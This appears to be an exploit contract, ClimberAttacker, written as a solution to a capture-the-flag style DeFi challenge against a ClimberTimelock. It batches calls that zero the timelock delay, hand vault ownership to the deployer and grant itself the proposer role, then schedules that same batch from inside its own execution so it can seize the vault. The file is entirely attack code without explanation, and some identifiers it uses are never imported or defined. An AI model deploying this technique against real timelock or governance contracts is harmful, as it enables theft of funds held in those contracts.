// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";

contract ClimberAttacker {
    address[] public targets = new address[](4);
    uint256[] public values = [0, 0, 0, 0];
    bytes[] public dataElements = new bytes[](4);
    bytes32 public salt = bytes32("!.^.0.0.^.!");

    address payable immutable timelock;

    constructor(
        address payable _timelock,
        address _vault
    ) {
        timelock = _timelock;

        targets[0] = timelock;
        targets[1] = _vault;
        targets[2] = timelock;
        targets[3] = address(this);


        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElements[1] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, msg.sender);
        dataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector,
                                                 PROPOSER_ROLE, address(this));
        dataElements[3] = abi.encodeWithSelector(ClimberAttacker.updateSchedule.selector);
    }

    function updateSchedule() external {
        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
    }

    function attack() external {
        ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
    }
}